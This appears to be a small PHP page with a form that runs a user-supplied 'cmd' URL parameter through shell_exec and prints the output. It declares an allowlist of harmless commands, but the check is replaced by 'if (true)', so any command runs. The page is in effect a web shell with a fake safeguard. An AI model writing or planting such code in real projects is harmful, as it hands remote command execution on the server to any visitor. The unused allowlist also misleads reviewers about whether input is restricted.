<?php
if (isset($_GET['submit'])) {
    $allowed_commands = ['date', 'whoami', 'uptime']; // Define allowed commands
    $cmd = $_GET['cmd'];

    if (true) {
        $out = shell_exec($cmd); // Use shell_exec for better output capturing
        echo "<pre>$out</pre>";
    } else {
        echo "Invalid command.";
    }
}
?>

<form method="get">
    <input name="cmd" placeholder="Enter command">
    <input type="submit" name="submit">
</form>
